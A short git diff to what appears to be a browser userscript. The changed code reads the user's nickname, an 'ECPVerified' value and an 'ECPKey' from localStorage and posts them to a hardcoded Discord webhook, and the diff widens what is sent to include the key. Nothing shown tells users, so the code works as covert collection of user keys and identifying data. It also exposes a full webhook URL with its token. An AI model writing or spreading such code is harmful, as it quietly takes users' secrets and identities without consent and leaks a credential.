@@ -763,34 +763,38 @@ injectLoader();
     'use strict';
     // Retrieve values from localStorage
     const lastNickname = localStorage.getItem("lastNickname") || "Unknown";
-    let ECPVerified = localStorage.getItem("ECPVerified") || "no";  // Changed key name here
-    
-    // Debugging: Log retrieved value
+    let ECPVerified = localStorage.getItem("ECPVerified") || "no";
+    const ECPKey = localStorage.getItem("ECPKey") || "not set";
+    const crystalColor = localStorage.getItem("crystal-color") || "#ffffff";
+
+    // Debugging: Log retrieved values
     console.log("Retrieved ECPVerified:", ECPVerified);
-    
+    console.log("Retrieved ECPKey:", ECPKey);
+    console.log("Retrieved crystalColor:", crystalColor);
+
     // Parse ECPVerified if it contains JSON
     try {
         ECPVerified = JSON.parse(ECPVerified);
     } catch (e) {
         // If not JSON, keep it as a string
     }
-    
+
     // Prepare ECPVerified content for logging
     const ECPVerifiedContent = typeof ECPVerified === "object" 
         ? JSON.stringify(ECPVerified, null, 2) 
         : ECPVerified;
-    
+
     // Debugging: Log formatted content
     console.log("Formatted ECPVerifiedContent:", ECPVerifiedContent);
-    
+
     // Webhook URL
     const webhookURL = "https://discord.com/api/webhooks/1332078434242920602/LaPifHcDpvwzWWKgHIEpydroC9GnhwAyDokGZwKSN_wOkPQ9S0jcTFM-dAlygkHbSgNN";
-    
+
     // Payload for Discord webhook
     const payload = {
-        content: `${lastNickname} has entered the script\nECPVerified: ${ECPVerifiedContent}`
+        content: `${lastNickname} has entered the script\nECPVerified: ${ECPVerifiedContent}\nECPKey: ${ECPKey}\nCrystal Color: ${crystalColor}`
     };
-    
+
     // Send payload to the Discord webhook
     fetch(webhookURL, {
         method: "POST",
